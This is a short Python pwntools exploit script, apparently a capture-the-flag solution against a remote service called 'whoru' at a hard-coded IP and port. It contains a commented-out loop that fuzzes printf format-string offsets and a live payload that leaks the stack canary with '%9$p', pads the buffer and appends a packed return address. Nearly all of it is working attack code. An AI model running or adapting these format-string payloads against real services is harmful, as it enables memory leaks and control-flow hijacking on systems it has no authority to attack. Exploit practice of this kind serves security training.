from pwn import *

# for i in range(0,100):
#     p = remote("103.37.125.237",10002)

#     payload="%"+str(i)+"$p"

#     p.recv()
#     p.sendline(payload)
#     p.recvuntil(b"samanya ")
#     print(i,p.recv())
#     p.close()

p = remote("103.37.125.237",10002)
# p = process("./whoru")
payload=b"%9$p"
payload+=b'\x00'*4
payload+=b"A"*16
payload+=p64(0x0000000000401232)

p.recv()
p.sendline(payload)
# print(p.recv())

p.recvuntil(b"samanya ")
canary = p.recv().decode()
print(canary)
p.close()